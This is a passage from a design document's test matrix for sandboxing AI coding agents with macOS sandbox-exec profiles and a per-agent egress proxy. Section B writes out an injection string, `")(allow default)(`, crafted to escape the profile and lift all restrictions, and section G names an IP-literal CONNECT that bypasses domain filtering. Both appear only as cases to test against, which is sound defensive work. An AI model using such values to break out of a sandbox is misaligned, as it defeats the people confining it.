  are sorted by resolved `-D` value rather than emitted first; each read entry
  emits an explicit write deny. The generator, pure resolver, SBPL oracle, and
  live macOS nested probe share and verify this contract (§4A.8).
- ✅ **Resolver models the paths table only (Adam, 2026-09-02).**
  `resolvePathAccess()` covers `allowRead`/`allowWrite`/`deny`/runtime roots, not
  `sandbox.rawAllow`; the sole sanctioned widening it does not model is the
  mandatory `(allow file-read-data (literal "/"))` root listing (§4A.8).
- ✅ **`allowedPaths` relationship (Adam, 2026-09-02):** it remains an
  independent legacy hook-layer field until Phase B. Kernel `paths:` never
  derives from it.

**RESOLVED EMPIRICALLY:**
1. ✅ Claude Code boots under the tractable `(deny default)` baseline; no
   `(allow default)` fallback was adopted.
2. ✅ The installed Codex uses `danger-full-access` under our wrapper and honors
   the per-agent proxy environment; spawn/resume parity is merged in phase 5.

## 8. Test matrix (MANDATED phase gate — from design review)

`bun test` green + `bunx tsc --noEmit` clean is the CLAUDE.md gate, but that
gates nothing *specific*. The matrix below is retained as the shipped regression
contract for phases 2–6, with the unshipped hook-layer follow-up called out in D.
The profile generator, glob compiler, merge, and proxy are pure/unit-testable
with no spawn required.

**A. Glob → regex translation (pure, table-driven):**
- `*` never crosses `/`; `?` = exactly one non-`/` char; `**` crosses `/`
  **including zero segments** — decide+test whether `**/.env` matches `/.env`.
- Literal dot: `**/.env` must NOT match `/x/yenv` or `/x/aenv`. Regex metachars in
  names escaped: `+ ( ) [ ] { } | ^ $` and SBPL string-context quotes.
- Full both-end anchoring: `~/secrets/*` → `^…/secrets/[^/]*$`; an unanchored slip
  turns an allow into a near-wildcard (regression test the anchors explicitly).
- `~` expansion in glob AND non-glob forms; bare-name rejection (`.env` → spawn
  refused with the §4A.2 error text); bare `~` legal (= `$HOME`).

**B. Profile emission (string asserts on generated `.sb`):**
- `(deny default)` emitted FIRST; ALL filesystem deny rules emitted AFTER every
  allow (last-match-wins is the entire §4A.0 guarantee); when `rawAllow` declares
  the network block/localhost exit, those lines are present in declared order.
- Runtime and unsafe configured subpaths travel via `-D` params; safe subpaths
  may be inspectable inline. Assert an injection path containing
  `")(allow default)(` must appear nowhere in the emitted `.sb`.
- `allowRead:["/"]` full-open form; empty lists; glob-form allow compiles to
  `(regex …)` under the correct op (`file-read*` vs `file-write*`).

**C. Config resolution + merge:**
- Union across `_all.md` + `_non_coordinator.md` + inherits + leaf for all three
  `paths` lists and both `sandbox` lists, with exact duplicates deduped within
  each list; shuffled layer and entry order yields the same merged sets.
  Deny-wins when the same path is in `allowWrite` AND `deny`; `enabled` OR-merges.
- **`rawAllow` emission + ordering:** every merged `rawAllow` line appears verbatim
  in the generated `.sb`, in the allow section BEFORE the config `deny` list (so
  config denies still win); a `rawAllow` `(deny network*)` followed by a localhost
  re-allow works via SBPL last-match-wins.
- `paths` omitted does not derive from `allowedPaths`; the legacy hook field is
  independent until Phase B.
- Frontmatter parse round-trip: flat sibling `paths:` and `sandbox:` blocks —
  block lists, inline arrays, comments; assert no silent flattening. An empty
  present `paths:` block resolves to three empty lists.
- **T-2 — validator REJECTION (load-bearing; guards the §4 inline-comment footgun):**
  spawn is refused when `enabled` is non-boolean (crucially incl. a trailing-comment
  string like `"true  # note"`, which is truthy and would otherwise silently pass),
  when `rawAllow`/`domains` is not an array, when an unknown key appears inside
  `sandbox:`, or when an old path key remains there (with `paths:` migration
  guidance). Validate all `paths:` children and reject unknown keys, malformed
  entries, and different read/write globs with the same literal prefix. Also reject a `rawAllow` entry
  that isn't a balanced `(...)` s-expression, and lint-warn on catch-all
  `rawAllow` lines (`(allow default)`, `(allow file-read*)` with no filter) that
  would defeat Model B. This is the guard §4 relies on to call the flat schema
  safe — assert each case refuses/warns with a specific message.

**D. Planned hook cascade follow-up (`agent-path.ts`) — not shipped in v1:**
- Sandbox-deny (new rule ~6.5) fires BEFORE the worktree allow (rule 7, :391) —
  the §4A.4 worked example as a test: worktree `.env` is denied.
- Non-matching denies leave rules 7/8/9 outcomes unchanged.
- Glob deny at the hook layer needs a real glob matcher — `isInAllowedPaths` is
  prefix-only (`:99`); use `Bun.Glob`. Test glob denies actually match.

**E. Meta persistence + resume parity:**
- Fully-resolved `paths` and `sandbox` blocks round-trip
  `writeMetaJsonAtomic` → `readAgentMeta`; both fields are declared in
  `AgentMeta`, coerced, and deep-copied. `meta.paths` is present even when
  sandboxing is disabled.
- Legacy meta with no `sandbox` → unsandboxed resume.
- Same inputs at spawn and resume → **byte-identical `sandbox.sb`** (C2 freeze).

**F. Fail-hard preconditions (§5.5), each a test:** `sandbox-exec` absent → refuse;
profile lint failure → refuse; port occupied → refuse; non-macOS → refuse. In
EVERY case assert: `claude`/`codex` was NOT exec'd, no tmux session left behind,
spawn exits non-zero with the specific message, cleanup ran.

**G. Proxy unit tests:** CONNECT allowed → tunnel / denied → refused; subdomain
wildcard depth (`*.x.com` — one label or many? §5.2); apex-vs-subdomain
(`github.com` vs `api.github.com` — per the §5.2 decision); absolute-URI plain
HTTP GET; IP-literal CONNECT → denied (bypasses domain semantics); case-insensitive
host compare; punycode; per-agent isolation (agent A's proxy NEVER consults agent
B's list).

**H. Codex (T-1 — phase 5 is not optional, so it needs tests):** `-s
danger-full-access` emitted when `sandbox.enabled`, `-s workspace-write` when not,
on BOTH the codex spawn AND resume scripts (`codex-spawn.ts:189/191`, `375/377`);
proxy env exported in both; `-a never` preserved.

**I. Proxy lifecycle (T-3/T-4, §5.2):** resume reallocates a fresh port (NOT the
persisted one) + rewrites meta + regenerates env; `start.sh` EXIT trap kills the
proxy on natural claude exit (not only via `teardownAgent`); watchdog
health-check restarts a dead proxy while claude lives (testable in the watchdog
tick harness).

**J. Path-entry canonicalization (G-7):** ENTRIES are canonicalized like matches —
a `/tmp/x` entry compiles as `/private/tmp/x`; assert an entry for a **not-yet-created**
dir still canonicalizes (the existing `allowedPaths` normalization at
`ib-commands.ts:4511-4516` has the gap to avoid: `realpathSync` on a nonexistent
path falls back unresolved, leaving `/tmp` un-canonicalized). Validator/generator
must resolve the symlink prefix that DOES exist.

**K. Dashboard marker (phase 6):** selected-agent info includes `🔒 Sandboxed`
when `meta.sandbox?.enabled === true` and excludes the marker when the value is
false or absent; rendering continues through the existing width truncation path.
